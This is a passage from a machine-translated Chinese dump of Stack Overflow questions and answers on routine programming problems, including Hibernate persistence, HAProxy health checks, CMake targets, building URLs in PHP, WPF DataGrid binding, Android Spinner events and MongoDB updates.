@Id
@GeneratedValue(strategy = GenerationType.AUTO)
@Column (name = "blush_id")
private Integer blsId; 
```

但是在执行插入查询时，仅生成了 id。不执行 saveOrUpdate 方法。

**DAO.java**

```
private SessionFactory sessionFactory;
public void setSessionFactory(SessionFactory sessionFactory){
    this.sessionFactory = sessionFactory;
} 
public void executeSaveOrUpdate(Object obj){            
    sessionFactory.getCurrentSession().saveOrUpdate(obj);//id generation occurs but the saveOrUpdate(obj) method is not executed
} 
```

没有抛出错误或异常，但插入查询没有执行（而是在控制台的第二行生成序列），控制进入下一个进程。

## 安慰：

```
16:41:55,928 INFO  [STDOUT] Hibernate: select category0_.cat_nbr as cat1_2_, category0_.added_by_name as added2_2_, category0_.added_ts as added3_2_, category0_.cat_dsc as cat4_2_, category0_.last_updt_by_name as last5_2_, category0_.last_updt_ts as last6_2_, category0_.mdse_grp_dsc as mdse7_2_, category0_.mdse_grp_nbr as mdse8_2_ from cvs_category_admin category0_ order by category0_.cat_nbr
16:41:56,037 INFO  [STDOUT] Hibernate: select hibernate_sequence.nextval from dual
16:41:56,084 INFO  [STDOUT] Hibernate: select blushrules0_.blush_id as blush1_1_, blushrules0_.added_by_name as added2_1_, blushrules0_.added_ts as added3_1_, blushrules0_.blush_item_type as blush4_1_, blushrules0_.cat_nbr as cat5_1_, blushrules0_.subcat_nbr as subcat12_1_, blushrules0_.is_active as is6_1_, blushrules0_.is_added as is7_1_, blushrules0_.last_updt_by_name as last8_1_, blushrules0_.last_updt_ts as last9_1_, blushrules0_.sku_nbr as sku10_1_, blushrules0_.status as status1_ from blush_admin_rules blushrules0_ where blushrules0_.status='A' 
```

请帮我解决这个问题..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T10:46:55.743

这是提交事务的问题，尤其是在多个查询的情况下。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-02-17T10:41:08.600

您还需要刷新会话。将以下内容添加到 saveupdate 语句中。

```
sessionFactory.getCurrentSession().flush() 
```

# java - 使用休眠的主键违规问题？

> ID：15110322
> 
> 赞同：1
> 
> 时间：2013-02-27T10:57:52.143
> 
> 标签：java, hibernate

我正在使用休眠。服务公开为 Web 服务。该服务将被 2 个应用程序调用。服务方法将记录保存到数据库中。

```
ServiceClass.java:
------------------

//Here Transaction will start
public void saveRecord(SampleEntity entity){

someDAO.saveData(entity);

}

SomeDao.java
-----------------

public void saveData(SampleEntity entity){
  //record is saved using saveOrUpdate method
} 
```

如果`saveRecord`方法被两个`at a time`具有相同 ID 的应用程序调用，`PK violation exception`则抛出该方法。

两个应用程序都发送具有相同 ID 的记录。

当我们使用`saveOrUpdate`它时，如果它已经存在，它应该更新记录。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:37:04.080

如果这是在事务中，则该行将被锁定（并且索引不会更新），直到事务提交。因此，如果更新发生在提交之前，它可能看起来像两个具有相同 PK 的插入。

# c - abs() 不能在 Xcode 上工作？

> ID：15110327
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:58:05.793
> 
> 标签：c, xcode

我从标准库 abs() 中得到不正确的值。在下面的示例中，最小值和最大值被正确评估为 -18635 和 3402，但 absMax 的结果为 3402，所以它应该是 18635。这应该有效，还是我犯了一个错误？

```
double    NormalizeWaveData(SInt16 *inData, long inlength)
{
    int maxAmp = 0, minAmp=0, absMax=0;
    for(long i=0; i<inlength; i++)
    {
        if( inData[i] > maxAmp)
           maxAmp = inData[i];
        if( inData[i] < minAmp)
           minAmp = inData[i];

        if( abs(inData[i]) > absMax)
           absMax = inData[i];

    }
... 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T11:06:56.637

你需要使用

```
if( abs(inData[i]) > absMax)
       absMax = abs(inData[i]); 
```

# entity-framework - 实体框架在 VS2012 中没有上下文菜单

> ID：15110329
> 
> 赞同：0
> 
> 时间：2013-02-27T10:58:10.113
> 
> 标签：entity-framework

我已经将 EntityFramework 从 VisualStudioGallery 安装到 VS2012，但是当我将鼠标悬停在项目上时，没有可用的“Entity Framework”上下文菜单。

菜单“管理 NuGet 包”在“资源”上可用，并且 EF 包已安装。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T14:56:38.430

也许你很困惑。要添加实体模型设计文件，您需要在项目中使用 RMouse，选择添加新并选择“数据”选项，然后选择“ **Ado.Net 实体数据模型”**”。

如果您想要 RMouse 菜单中的“实体框架”选项，您可能正在谈论 Entity Power Tools，为此您需要获取该插件[Entity Framework Power Tools](http://visualstudiogallery.msdn.microsoft.com/72a60b14-1581-4b9b-89f2-846072eff19d)

Entity Power Tools 将启用 RMouse 主菜单中的“ **Entity Framework** ”选项，用于在您的数据库中生成 POCO 类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T13:34:18.420

尝试安装 2012.2 更新[http://www.asp.net/vnext](http://www.asp.net/vnext)。

# ubuntu - HAProxy - 停止处理来自服务器的 500 请求

> ID：15110331
> 
> 赞同：5
> 
> 时间：2013-02-27T10:58:15.810
> 
> 标签：ubuntu, haproxy

当银行服务器发送 500 时，有什么方法可以停止满足 HAProxy 对服务器的进一步请求？

当服务器接收到类似 SIGINT 的信号时，它将开始提供 "500 Server Internal Error" 。那么当 HAProxy 检测到来自服务器的 500 响应时，它是否能够停止对服务器的进一步请求？

服务器部分默认启用一个宏“on-error”。尝试并没有产生任何结果。例如：

```
server nucleus_server1 127.0.0.1:12341 check on-error mark-down 
```

.宏 on-mark-down 不适用于此。

有任何想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-02-28T17:45:35.517

如果您希望 HAProxy 根据此服务器发送的返回码将服务器标记为 DOWN，请在服务器定义中添加“观察 layer7”选项。对于您的示例，它可能如下所示：

```
server nucleus_server1 127.0.0.1:12341 check on-error mark-down observe layer7 error-limit 1 
```

这意味着如果 nucleus_server1 向任何客户端请求返回 500，它将从池中删除。通过“错误限制”，您可以配置必须返回多少个 500 才能将此服务器标记为“关闭”。

如果内部 HAProxy 检查成功（默认为 2 次），服务器将再次标记为“UP”。

查看：检查、下降、提升、错误限制，观察 HAProxy 文档中的选项以获取更多信息。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-27T21:03:43.833

你在使用`httpchk`选项吗？对于不是 2xx 或 3xx 的响应，它将失败，并且 HAProxy 将停止向该机器发送流量。

从[官方文档](https://code.google.com/p/haproxy-docs/wiki/httpchk)：

```
# Relay HTTPS traffic to Apache instance and check service availability
# using HTTP request "OPTIONS * HTTP/1.1" on port 80.
backend https_relay
    mode tcp
    option httpchk OPTIONS * HTTP/1.1\r\nHost:\ www
    server apache1 192.168.1.1:443 check port 80 
```

但它可以很简单：

```
 option httpchk GET /_health 
```

where`/_health`返回一个好的状态码。

# cmake - CMake错误“找不到要添加属性的目标”

> ID：15110336
> 
> 赞同：7
> 
> 时间：2013-02-27T10:58:21.923
> 
> 标签：cmake

在我的 CMakeLIsts.txt 文件中，我这样写：

```
set(LIBHELLO_SRC hello.c)
set_target_properties(hello_static PROPERTIES OUTPUT_NAME "hello")
get_target_property(OUTPUT_VALUE hello_static OUTPUT_NAME)
message(STATUS "This is the hello_static OUTPUT_NAME:"${OUTPUT_VALUE}) 
```

当我运行时`cmake`，它显示错误消息：

```
set_target_properties Can not find target to add properties to: hello_static 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-27T13:40:11.060

要使您的代码正常工作，`hello_static` *必须*是 CMake 目标的名称；例如通过[`add_executable`](http://www.cmake.org/cmake/help/v2.8.10/cmake.html#command%3aadd_executable)or命令添加的东西。[`add_library`](http://www.cmake.org/cmake/help/v2.8.10/cmake.html#command%3aadd_library)

这与您的项目名称无关。

看起来您缺少以下内容：

```
add_library(hello_static ${LIBHELLO_SRC}) 
```

这将立即放置在

```
set(LIBHELLO_SRC hello.c) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:03:39.657

试试这个：

```
project(hello_static)
set(LIBHELLO_SRC hello.c)
add_executable(hello_static ${LIBHELLO_SRC})
set_target_properties(hello_static PROPERTIES OUTPUT_NAME "hello")
get_target_property(OUTPUT_VALUE hello_static OUTPUT_NAME)
message(STATUS "This is the hello_static OUTPUT_NAME:"${OUTPUT_VALUE}) 
```

这对我有用。

但是，如果您只想要一个“hello”可执行文件。您可以将其简化为：

```
project(hello_static)
set(LIBHELLO_SRC hello.c)
add_executable(hello ${LIBHELLO_SRC}) 
```

# php - 使用 TCA 文件在数据库中创建日期时间列

> ID：15110340
> 
> 赞同：0
> 
> 时间：2013-02-27T10:58:35.637
> 
> 标签：php, mysql, typo3

在我的 Typo3 扩展中，我希望我的表列之一为“ *datetime* ”，*类型为“timestamp”* ，**默认为“CURRENT_TIMESTAMP”**。如何在 TCA 文件中创建它。

我在下面给出了我的代码。但这不是创建类型为timespamp 且默认值为CURRENT_TIMESTAMP 的列。

```
 'datetime' => array(       
        'exclude' => 0,     
        'label' => 'LLL:EXT:besi_jobs/locallang_db.xml:tx_jobs_messages.datetime',      
        'config' => array(
            'type'     => 'timestamp',
            'size'     => '12',
            'max'      => '20',
            'eval'     => 'datetime',
            'checkbox' => '0',
            'default'  => 'CURRENT_TIMESTAMP'

        )
    ), 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T13:47:36.570

类型必须设置为**'input'**：

```
'datetime' => array(        
    'exclude' => 0,     
    'label' => 'LLL:EXT:besi_jobs/locallang_db.xml:tx_jobs_messages.datetime',      
    'config' => array(
        'type'     => 'input',
        'size'     => '12',
        'max'      => '20',
        'eval'     => 'datetime',
        'checkbox' => '0',
        'default'  => time(),
    )
), 
```

### 笔记

*   **[TCA 参考](http://docs.typo3.org/typo3cms/TCAReference/)**中描述了所有可能的类型。
*   扩展名的 .sql 文件文件中的字段应该是`int(11) unsigned NOT NULL DEFAULT '0'`. TCA 定义既不创建也不更改数据库。它仅定义字段在表单中的显示方式。

# ruby-on-rails - Don't know how to realize some issues in Rails

> ID：15110342
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:58:45.040
> 
> 标签：ruby-on-rails

My application has a Rating model and a Party model which belongs_to Rating.

When I create a new Rating, Rails renders a form to take the Rating name and than creates it, with no parties.

But I want Rating to have **at least two parties**, so when I create a new Rating, after submitting the name it should redirect to creating 2 parties.

Do not sure how to realize that, do you have some advice?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:33:56.743

Sounds like you probably want [Nested Attributes](http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html) with [`fields_for`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html) for the form. This will enable you to easily create your `Party` objects from your `Rating` controller.

# c# - TryTake 对阻塞收集的性能

> ID：15110348
> 
> 赞同：1
> 
> 时间：2013-02-27T10:59:01.753
> 
> 标签：c#, performance

我有一个有时运行速度很慢的程序。

我尝试了 Teleriks Justtrace 来找出可能导致应用程序挂起的原因。

一个非 UI 线程（因此我相信这不是真正的挂起原因）执行异步。获取对象（入队工作项）并将其从队列中取出来做一些工作。

入队：

```
public void EnqueueObject(WorkUnit workunit)
        {
            try
            {
                workUnits.Add(workunit);
            }
            catch (Exception ex)
            {
                /handle exception
            }
        } 
```

出队：

```
public WorkUnit Dequeue()
        {
            try
            {
                WorkUnit aWorkUnit  = null;
                workUnits.TryTake(out aWorkUnit, 1000);

                return aWorkUnit ;
            }
            catch (InvalidOperationException ex)
            {
                // 

            }
                    return null;
        } 
```

TryTake 用于检查当前工作的中止（而不是 BlockingCollection Complete 方法，它在调用时会抛出一些错误 - 我不想在程序流中使用错误）

调用出队：

```
 while(!isStopped)
 {
   ProcessWorkItem(Dequeue());
 } 
```

到这里为止，它看起来很简单。

问题是，Teleriks JustTrace 显示，“workUnits.TryTake(out aWorkUnit, 1000);”行 占用程序总执行时间的 30%。

怎么会这样？

更多细节表明，在 TryTake System.Threading.Monitor.Wait 内部一直占用 - 我认为 Wait 会发送一个线程进入睡眠状态，因此它在等待期间不会消耗任何东西。思想的错误在哪里？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:03:16.973

您可以尝试`workUnits.TryTake(out aWorkUnit)`不使用 timeout 参数。然后，你应该修改`while`循环看起来类似于这样：

```
 while(!isStopped)
 {
    WorkUnit wu = Dequeue(); 
    if(wu != null) 
       ProcessWorkItem(wu);
    else
       Thread.Sleep(40);
 } 
```

此外，如果您在 UI 线程上运行此代码，它会使您的 UI 无响应。例如，您应该使用[`BackgroundWorker`](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)该操作。这是`BackgroundWorker`MSDN 文档中对类的描述：

> BackgroundWorker 类允许您在单独的专用线程上运行操作。下载和数据库事务等耗时的操作可能会导致您的用户界面 (UI) 在运行时似乎停止响应。当您需要响应式 UI 并且面临与此类操作相关的长时间延迟时，BackgroundWorker 类提供了一种方便的解决方案。

# php - 如何安全地获取当前 PHP 页面的父目录的完整 URL

> ID：15110355
> 
> 赞同：17
> 
> 时间：2013-02-27T10:59:19.207
> 
> 标签：php, url, path

我正在使用：

```
$domain = $_SERVER['HTTP_HOST'];
$path = $_SERVER['SCRIPT_NAME'];
$themeurl = $domain . $path; 
```

但这当然给出了完整的 URL。相反，我**需要完整的 URL 减去当前文件和一个目录并减去尾部斜杠**。

因此，无论浏览器 URL 域是什么，例如 localhost、https://、http:// 等，父目录的完整真实（绕过任何 mod 重写）URL 路径都没有尾部斜杠。

这是怎么做到的？安全，所以没有 XSS，因为我猜（从阅读中）使用除“SCRIPT_NAME”之外的任何东西都有这样的风险.. 虽然不确定.. 只是读了很多试图弄清楚这一点。

示例：如果给出：

```
https://stackoverflow.com/questions/somequestions/index.php 
```

需要：

```
https://stackoverflow.com/questions 
```

没有尾部斜杠。

并且还应该适用于：

```
http://localhost/GetSimple/admin/load.php 
```

要得到

```
http://localhost/GetSimple 
```

这就是我想要做的。

谢谢你。

* * *

* * *

**编辑：** 这是我使用的工作解决方案：

```
$url  = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
$url .= $_SERVER['SERVER_NAME'];
$url .= htmlspecialchars($_SERVER['REQUEST_URI']);
$themeurl = dirname(dirname($url)) . "/theme"; 
```

它完美地工作。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2013-02-27T11:03:19.007

这很容易 - 使用该功能[`dirname`](http://www.php.net/manual/en/function.dirname.php)两次 :)

```
echo dirname(dirname('https://stackoverflow.com/questions/somequestions/index.php')); 
```

* * *

另请注意@Sid 的评论。当您需要当前脚本的完整 uri 时，使用协议和服务器使用如下内容：

```
$url  = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
$url .= $_SERVER['SERVER_NAME'];
$url .= $_SERVER['REQUEST_URI'];

echo dirname(dirname($url)); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-26T04:28:21.463

我有更简单的语法来获取带有端口和 url 的父地址让我们试试我的代码

```
dirname($_SERVER['PHP_SELF']) 
```

使用此代码，如果您想 2x 回滚目录，您可以获得 adres 的直接父级，您可以循环

```
dirname(dirname($_SERVER['PHP_SELF'])) 
```

dirname 是获取父地址网络的功能， $_SERVER['PHP_SELF'] 可以显示当前地址网络。

谢谢先生[https://stackoverflow.com/users/171318/hek2mgl](https://stackoverflow.com/users/171318/hek2mgl)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-04-01T20:52:19.227

我不建议将`dirname()`其用于目录而不是用于 URI。例子：

*   `dirname("http://example.com/foo/index.php")`返回`http://example.com/foo`
*   `dirname("http://example.com/foo/")`返回`http://example.com`
*   `dirname("http://example.com/")`返回`http:`
*   `dirname("http://example.com")`返回`http:`

所以你必须非常小心`$_SERVER`你使用哪个 var，当然它只适用于这个特定的问题。一个更好的通用解决方案是使用[currentdir()](https://stackoverflow.com/a/29147968/318765)在此基础上您可以使用它来获取父目录：

```
function parentdir($url) {
    // note: parent of "/" is "/" and parent of "http://example.com" is "http://example.com/"
    // remove filename and query
    $url = currentdir($url);
    // get parent
    $len = strlen($url);
    return currentdir(substr($url, 0, $len && $url[ $len - 1 ] == '/' ? -1 : $len));
} 
```

例子：

*   `parentdir("http://example.com/foo/bar/index.php")`返回 `http://example.com/foo/`
*   `parentdir("http://example.com/foo/index.php")`返回`http://example.com/`
*   `parentdir("http://example.com/foo/")`返回`http://example.com/`
*   `parentdir("http://example.com/")`返回`http://example.com/`
*   `parentdir("http://example.com")`返回`http://example.com/`

所以你会有更稳定的结果。也许您可以解释为什么要删除尾部斜杠。我的经验是，它会产生更多问题，因为您无法区分名为“/foo”的文件和不使用`is_dir()`. 但是，如果这对您很重要，您可以[删除最后一个 char](https://stackoverflow.com/q/7045618/318765)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-12-06T10:26:09.307

此示例适用于端口

```
function full_url($s)
{
    $ssl = (!empty($s['HTTPS']) && $s['HTTPS'] == 'on') ? true:false;
    $sp = strtolower($s['SERVER_PROTOCOL']);
    $protocol = substr($sp, 0, strpos($sp, '/')) . (($ssl) ? 's' : '');
    $port = $s['SERVER_PORT'];
    $port = ((!$ssl && $port=='80') || ($ssl && $port=='443')) ? '' : ':'.$port;
    $host = isset($s['HTTP_HOST']) ? $s['HTTP_HOST'] : $s['SERVER_NAME'];
    return $protocol . '://' . $host . $port . $s['REQUEST_URI'];
}
$themeurl = dirname(dirname(full_url($_SERVER))).'/theme';
echo '<a href="'.htmlspecialchars($themeurl,ENT_QUOTES,'UTF-8').'">Theme URL</a>'; 
```

来源：[https ://stackoverflow.com/a/8891890/175071](https://stackoverflow.com/a/8891890/175071)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T11:09:11.327

我和 hek2mgl 在一起。但是，万一脚本并不总是低于目标的 2 个目录，您可以使用explode：

```
$parts = explode("/",ltrim($_SERVER['SCRIPT_NAME'],"/"));
echo $_SERVER['HTTP_HOST'] . "/" . $parts[0]; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-27T11:09:11.560

正如 hek2mgl 所提到的，这是正确的，而且更动态的方法是`dirname(dirname(htmlspecialchars($_SERVER['REQUEST_URI'])));`.

编辑：

$_SERVER['REQUEST_URI'] 将省略域名。参考@hek2mgl 的帖子，你可以`echo dirname(dirname(htmlspecialchars($url)));`

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2014-02-17T07:57:39.147

### 以下是获取所需路径的有用命令：

（例如，您在**http://yoursite.com/folder1/folder2/file.php**中执行）

```
__FILE__   (on L.Hosting)   === /home/xfiddlec/http_docs/folder1/folder2/yourfile.php
__FILE__   (on Localhost) === C:\wamp\www\folder1\folder2\yourfile.php 
$_SERVER['HTTP_HOST']     === www.yoursite.com (or without WWW)   
$_SERVER["PHP_SELF"]      === /folder1/folder2/yourfile.php
$_SERVER["REQUEST_URI"]   === /folder1/folder2/yourfile.php?var=blabla
$_SERVER["DOCUMENT_ROOT"] === /home/xfiddlec/http_docs

// BASENAME and DIRNAME (lets say,when __file__ is '/folder1/folder2/yourfile.php'
basename(__FILE__)  ==== yourfile.php
dirname(__FILE__)   ==== /folder1/folder2 
```

### 例子：

*首页网址             `( yoursite.com )`

```
<?php echo $_SERVER['HTTP_HOST'];?> 
```

*文件的基本网址     `( yoursite.com/anyfolder/myfile.php )`

```
<?php echo $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; ?> 
```

*完成当前网址`( yoursite.com/anyfolder/myfile.php?action=blabla )`

```
<?php echo $_SERVER['HTTP_HOST'].$_SERVER["REQUEST_URI"];?> 
```

*当前文件夹的 URL`( yoursite.com/anyfolder/ )`

```
<?php echo $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']);  ?> 
```

*获取文件的 RealPath（即使它包含在内）（将 /var/public_html 更改为您想要的根目录）

```
<?php
$cur_file=str_replace('\\','/',__FILE__); //Then Remove the root path::
$cur_file=preg_replace('/(.*?)\/var\/public_html/','',$cur_file);
?> 
```

**psfor wordpress**，已经存在预定义的函数来获取插件或主题 url。

```
i.e. get plugin folder ( http://yoursite.com/wp-content/plugins/pluginName/ )
<?php echo plugin_dir_url( __FILE__ );?> 
```

# wpf - WPF DataGridCheckColumn，选择更改后选中复选框

> ID：15110361
> 
> 赞同：0
> 
> 时间：2013-02-27T10:59:27.660
> 
> 标签：wpf, datagrid, checkbox

我有 DataGrid 喜欢：

```
<DataGrid Name="paragonyDG" AutoGenerateColumns="False" CanUserAddRows="False" ItemsSource="{Binding zaznaczone}" >
                <DataGrid.Columns>
                    **<DataGridCheckBoxColumn Header="Zaznacz" Binding="{Binding check}"></DataGridCheckBoxColumn>**
                    <DataGridTextColumn Header="Nazwa paragonu" Binding="{Binding nazwa}"></DataGridTextColumn>
                    <DataGridTextColumn Header="Wystawiony przez" Binding="{Binding osoba}"></DataGridTextColumn>
                    <DataGridTextColumn Header="Kwota paragonu" Binding="{Binding kwota}"></DataGridTextColumn>
                    <DataGridTextColumn Header="Rabat" Binding="{Binding rabat}"></DataGridTextColumn>
                    <DataGridTextColumn Header="Data otwarcia" Binding="{Binding dataO}"></DataGridTextColumn>
                    <DataGridTextColumn Header="Data zamknięcia" Binding="{Binding dataZ}"></DataGridTextColumn>
                    <DataGridTextColumn Header="Formy płatności" Binding="{Binding formy}"></DataGridTextColumn>
                </DataGrid.Columns>
            </DataGrid> 
```

并将其绑定到类中：

```
public class zaznaczone
{
    public bool check { get; set; }
    public int docID { get; set; }
    public string nazwa { get; set; }
    public string osoba { get; set; }
    public decimal kwota { get; set; }
    public decimal rabat { get; set; }
    public string dataO { get; set; }
    public string dataZ { get; set; }
    public string formy { get; set; }
} 
```

现在，在 datagrid.selectionchanged 中，我想选中此复选框。我试图将 selectedItem.columns[0] 解析为复选框，但我无法将 datagridrow 解析为“zaznaczone”。我如何检查复选框？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:19:11.400

指定:`SelectedItem`的属性。之后，您可以修改.`DataGrid``SelectedItem="{Binding zaznaczoneItem}"``check``zaznaczoneItem`

请注意，您`DataContext`应该实施`INotifyPropertyChanged`. 我建议你看看[MVVMLight 框架](http://mvvmlight.codeplex.com/)

# iphone - IPA 不适用于 iPad ios 6.0.1

> ID：15110366
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:59:59.747
> 
> 标签：iphone, ios, objective-c, ipad

我用 xcode 创建 IPA 文件。它们适用于 iPad iOS 4.3 和 iPhone。但它们不适用于 iPad ios 6.0.1。在 iPad ios 6.0.1 上，第一个 IPA 不启动。第二次启动，但没有显示任何内容。可能是什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:05:40.507

尝试安装最新的 iOS SDK（并更新 Xcode），问题可能是使用旧 sdk 编译的 ipa 无法在最新 ios 系统版本的设备上运行。

# android - Android - Spinner，onItemSelected(...) 未被调用

> ID：15110369
> 
> 赞同：12
> 
> 时间：2013-02-27T11:00:16.043
> 
> 标签：android, spinner

这是代码：

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.json.JSONArray;
import org.json.JSONObject;
import com.project.locationapp.model.Device;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.app.Activity;
import android.content.Intent;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemSelectedListener;
import android.widget.ArrayAdapter;
import android.widget.Spinner;

public class SelectDevice extends Activity implements OnItemSelectedListener {

private Spinner deviceSpinner;
private List<Device> deviceList;
private ArrayAdapter<Device> deviceAdapter;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_select_device);
    deviceList = new ArrayList<Device>();

    try {
        deviceSpinner = (Spinner) findViewById(R.id.select_device_spinner);
        deviceAdapter = new DeviceAdapter(this, android.R.layout.simple_spinner_dropdown_item, deviceList);
        deviceSpinner.setAdapter(deviceAdapter);
        deviceSpinner.setOnItemSelectedListener(this);

        DataAsyncTask loadDevices = new DataAsyncTask();
        loadDevices.execute(new String[] { WebServiceURL.WEB_SERVICE + WebServiceURL.DEVICES + WebServiceURL.ALL });

    } catch (Exception e){
        Log.e(TAG, e.getLocalizedMessage(), e);
    }
}

@Override
public void onItemSelected(AdapterView<?> a, View v, int position,
        long id) {

    Log.d(TAG, "called!");  
    Intent intent = new Intent(this, ViewTrips.class);
    intent.putExtra("device_id", deviceAdapter.getItem(position).getId());
    startActivity(intent);

}
} 
```

设备适配器类：

```
import java.util.List;
import com.project.locationapp.model.Device;
import android.content.Context;
import android.widget.ArrayAdapter;

public class DeviceAdapter extends ArrayAdapter<Device> {

public DeviceAdapter(Context context, int textViewResourceId,
        List<Device> objects) {
    super(context, textViewResourceId, objects);
}
} 
```

活动布局xml：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
tools:context=".SelectDevice" >

<TextView
    android:id="@+id/instructions_device_select"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_centerHorizontal="true"
    android:text="@string/select_device_instructions"
    android:layout_marginTop="10dp"
    android:layout_marginBottom="10dp"
    android:layout_marginRight="15dp"
    android:layout_marginLeft="15dp" />

<Button
    android:id="@+id/start_service_button"
    android:layout_below="@id/instructions_device_select"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:onClick="thisDevice"
    android:text="@string/this_device"
    android:layout_marginTop="10dp"
    android:layout_marginRight="40dp"
    android:layout_marginLeft="40dp" />

<Spinner
    android:id="@+id/select_device_spinner"
    android:layout_below="@id/start_service_button"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:prompt="@string/select_device"
    android:layout_marginTop="20dp"
    android:layout_marginLeft="5dp"
    android:drawSelectorOnTop = "true" />

</RelativeLayout> 
```

我正在等待让它正常工作，然后我将进一步自定义 DeviceAdapter。

，`Activity implements OnItemSelectedListener`因此覆盖`onItemSelected(...)`，根本没有被调用。中没有错误`LogCat`。`Spinner`在 Activity 的布局 xml 中定义，并且可以很好地显示和填充。任何解决此问题的建议都会很棒。

谢谢你。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-27T11:49:40.947

可能是微调器布局，我可以看到您没有为适配器设置下拉视图。你可以尝试像这样初始化你的微调器：

```
deviceAdapter = new DeviceAdapter(this, android.R.layout.simple_spinner_item, deviceList);
deviceSpinner.setAdapter(deviceAdapter);
deviceAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
deviceSpinner.setOnItemSelectedListener(this); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-01T12:26:22.460

我今天面临同样的问题。然后我意识到我正在模拟器上测试。当我测试相同的应用程序时，它可以工作。如果有人试图通过模拟器回电微调器，我将发布此消息，它对我不起作用。你也可以检查一下。它适用于真实设备

# java - jax-ws 未定义的端口类型，客户端和服务器在不同的项目中

> ID：15110371
> 
> 赞同：2
> 
> 时间：2013-02-27T11:00:21.033
> 
> 标签：java, web-services, soap, jax-ws

我正在开发一个在 localhost 中运行 Web 服务的项目。我为此使用了 jax-ws。当我在与服务器相同的项目中有一个客户端时，它工作正常。但是现在我正在尝试创建一个新的客户端项目，但是当我尝试运行时出现此错误：

```
Undefined port type: {http://test.main/}MyWSInterface 
```

我已经在两个类中复制了接口：

```
package main.test; 
```

导入 javax.activation.DataHandler；导入 javax.jws.WebMethod；导入 javax.jws.WebService；导入 javax.jws.soap.SOAPBinding；导入 javax.jws.soap.SOAPBinding.Style；

```
@WebService
@SOAPBinding(style = Style.RPC)
public interface MyWSInterface {

@WebMethod public void sendTask(String convertType, String outputFileName, DataHandler dH);

} 
```

在我的主要测试方法中，我在这一行得到了这个错误：

```
MyWSInterface dsws = service.getPort(MyWSInterface.class); 
```

这是此方法的第 4 行：

```
private void runTest() throws MalformedURLException {
    URL url = new URL("http://localhost:8080/MyWS?wsdl");
    QName qname = new QName("http://ws.sender.something.somecompany.com/", "MyWSInterfaceImplService");

    Service service = Service.create(url, qname);
    DocShifterWS dsws = service.getPort(DocShifterWS.class);
    FileDataSource ds = new FileDataSource(new File("C:\\temp\\testinput.txt\\"));
    DataHandler dh = new DataHandler(ds);
    dsws.sendTask("pdf", "something.pdf", dh);

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-23T18:10:57.077

在实现类的@WebService注解中给出endpointIneterface，如果不给出端点接口，则在使用getPort方法时必须提及完全限定的端口名称。

MyWSInterface dsws = service.getPort(PortQName,MyWSInterface.class);

# javascript - 当我尝试查找和修改时，mongodb 错误

> ID：15110372
> 
> 赞同：0
> 
> 时间：2013-02-27T11:00:22.093
> 
> 标签：javascript, node.js, mongodb, mongoskin

这是mongodb中的结构

```
{   code:'ACBD5588',
    email:'owner@mail.com',
    object{
        array_doc:[//many documents with this structure
        {
            code_doc:'ANCB7894',
            info_doc:'....',
            //etc
        }
        ],
        counting:45,
    }
} 
```

我试图删除数组内的文档，该文档有一个唯一的 code_array，所以在数组中有许多文档具有唯一的 code_array，我想删除数组内的文档

```
db.collection('database').findAndModify(
        {
            'code':code,
            'email':email,
        },[],{$pull:{'object.array_doc':{'code_doc':code_doc}}},function(err,resultado)
        { 
```

但是操作给了我这个错误

```
uncaught exception: findAndModifyFailed failed: { "errmsg" :
